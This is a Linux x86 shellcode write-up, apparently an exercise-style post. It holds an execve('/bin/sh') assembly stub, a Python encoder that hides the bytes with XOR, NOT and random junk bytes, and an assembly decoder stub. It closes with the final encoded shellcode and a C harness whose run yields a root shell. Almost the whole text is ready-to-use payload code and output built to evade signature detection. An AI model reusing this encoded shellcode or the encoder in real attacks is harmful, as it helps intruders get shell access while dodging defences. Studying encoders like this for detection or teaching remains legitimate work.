# Date: 4th October 2019
# Shellcode Author: @bolonobolo - https://bolonobolo.github.io
# Tested on: Linux x86

######################## execve.asm ###############################

global _start

section .text
_start:


	; put NULL bytes in the stack
	xor eax, eax
	push eax

	//bin/sh
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp

	; push NULL in the EDX position
	push eax
	mov edx, esp

	; push in the stack and then move it in ECX
	push ebx
	mov ecx, esp

	; call the execve syscall
	mov al, 11
	int 0x80
###############################################################

compile the execve-stack
$ nasm -f elf32 execve.asm
$ ld -N -o sh execve.o
$ echo;objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
-d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/
/\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g';echo

"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

########################## encoder_mixer.py ####################

#!/usr/bin/python

# Python Encoder (XOR + NOT + Random)
import random
green = lambda text: '\033[0;32m' + text + '\033[0m'

shellcode =
("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""

# The end char is 0xaa
end = "\\xaa"

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :

        if x < 128:
                # XOR Encoding with 0xDD
                x = x^0xDD
                # placeholder for XOR is 0xbb
                encoded += '\\xbb'
                encoded += '\\x'
                encoded += '%02x' % x
        else:
		# NOT encoding
                x = ~x
		# placeholder for NOT is 0xcc
                encoded += '\\xcc'
                encoded += '\\x'
                encoded += '%02x' % (x & 0xff)

	 # 0xaa is 170 in dec and the others placeholders are > of 170
        encoded += '\\x%02x' % random.randint(1,169)

print green("Shellcode Len: %d" % len(bytearray(shellcode)))
print green("Encoded Shellcode Len: %d" % len(bytearray(encoded)))
encoded = encoded + end
print encoded
nasm = str(encoded).replace("\\x", ",0x")
nasm = nasm[1:]
# end string char is 0xaa
print green("NASM version:")
# end = end.replace("\\x", ",0x")
print nasm

###################################################################

root@root:$ ./encoder_mixer.py
Encoded shellcode ...
Shellcode Len: 25
Encoded Shellcode Len: 300
\xbb\xec\x26\xcc\x3f\x4a\xbb\x8d\x3d\xbb\xb5\x44\xbb\xb3\x5b\xbb\xf2\x65\xbb\xae\x09\xbb\xb5\x2a\xbb\xb5\x2b\xbb\xf2\x1a\xbb\xf2\x4d\xbb\xbf\x9a\xbb\xb4\x61\xcc\x76\x56\xcc\x1c\x59\xbb\x8d\x56\xcc\x76\x6c\xcc\x1d\x94\xbb\x8e\x02\xcc\x76\xa5\xcc\x1e\x6d\xcc\x4f\xa3\xbb\xd6\x22\xcc\x32\x18\xcc\x7f\x7b\xaa
NASM version:
0xbb,0xec,0x26,0xcc,0x3f,0x4a,0xbb,0x8d,0x3d,0xbb,0xb5,0x44,0xbb,0xb3,0x5b,0xbb,0xf2,0x65,0xbb,0xae,0x09,0xbb,0xb5,0x2a,0xbb,0xb5,0x2b,0xbb,0xf2,0x1a,0xbb,0xf2,0x4d,0xbb,0xbf,0x9a,0xbb,0xb4,0x61,0xcc,0x76,0x56,0xcc,0x1c,0x59,0xbb,0x8d,0x56,0xcc,0x76,0x6c,0xcc,0x1d,0x94,0xbb,0x8e,0x02,0xcc,0x76,0xa5,0xcc,0x1e,0x6d,0xcc,0x4f,0xa3,0xbb,0xd6,0x22,0xcc,0x32,0x18,0xcc,0x7f,0x7b,0xaa

#################### decoder_mixer.asm ############################

global _start

section .text
_start:


	jmp short call_decoder


decoder:
        ; the sequence of the chars in shellcode is:
	; placehlder,obfuscated shellcode char,random char
	pop esi
        lea edi, [esi]
        xor eax, eax
        xor ebx, ebx

switch:

        mov bl, byte [esi + eax]
        cmp bl, 0xaa
        jz shellcode
        cmp bl, 0xbb
        jz xordecode
        jmp notdecode

xordecode:

        mov bl, byte [esi + eax + 1]
        mov byte [edi], bl
        xor byte [edi], 0xDD
        inc edi
        add al, 3
        jmp short switch

notdecode:

        mov bl, byte [esi + eax + 1]
        mov byte [edi], bl
        not byte [edi]
        inc edi
        add al, 3
        jmp short switch

call_decoder:

	call decoder
	shellcode: db
0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa

############################### shellcode ############################

$ nasm -f elf32 decoder_mixer.asm
$ ld -o decoder decoder_mixer.o
$ objdump -d ./decoder_mixer|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
-d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/
/\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\xeb\x31\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\xaa\x74\x27\x80\xfb\xbb\x74\x02\xeb\x0e\x8a\x5c\x06\x01\x88\x1f\x80\x37\xdd\x47\x04\x03\xeb\xe3\x8a\x5c\x06\x01\x88\x1f\xf6\x17\x47\x04\x03\xeb\xd6\xe8\xca\xff\xff\xff\xbb\xec\x73\xcc\x3f\x9d\xbb\x8d\x51\xbb\xb5\x1b\xbb\xb3\x22\xbb\xf2\x79\xbb\xae\x8e\xbb\xb5\x61\xbb\xb5\x3d\xbb\xf2\x6e\xbb\xf2\x9f\xbb\xbf\x10\xbb\xb4\x89\xcc\x76\x2d\xcc\x1c\x2f\xbb\x8d\x91\xcc\x76\x7e\xcc\x1d\x92\xbb\x8e\x80\xcc\x76\x7b\xcc\x1e\xa7\xcc\x4f\x7f\xbb\xd6\x2b\xcc\x32\x24\xcc\x7f\x37\xaa"

## Put the hex code in a C script

root@root:# cat shellcode.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x31\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\xaa\x74\x27\x80\xfb\xbb\x74\x02\xeb\x0e\x8a\x5c\x06\x01\x88\x1f\x80\x37\xdd\x47\x04\x03\xeb\xe3\x8a\x5c\x06\x01\x88\x1f\xf6\x17\x47\x04\x03\xeb\xd6\xe8\xca\xff\xff\xff\xbb\xec\x73\xcc\x3f\x9d\xbb\x8d\x51\xbb\xb5\x1b\xbb\xb3\x22\xbb\xf2\x79\xbb\xae\x8e\xbb\xb5\x61\xbb\xb5\x3d\xbb\xf2\x6e\xbb\xf2\x9f\xbb\xbf\x10\xbb\xb4\x89\xcc\x76\x2d\xcc\x1c\x2f\xbb\x8d\x91\xcc\x76\x7e\xcc\x1d\x92\xbb\x8e\x80\xcc\x76\x7b\xcc\x1e\xa7\xcc\x4f\x7f\xbb\xd6\x2b\xcc\x32\x24\xcc\x7f\x37\xaa";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}



root@root# gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
root@root# ./shellcode
Shellcode Length:  132
# whoami
root
# exit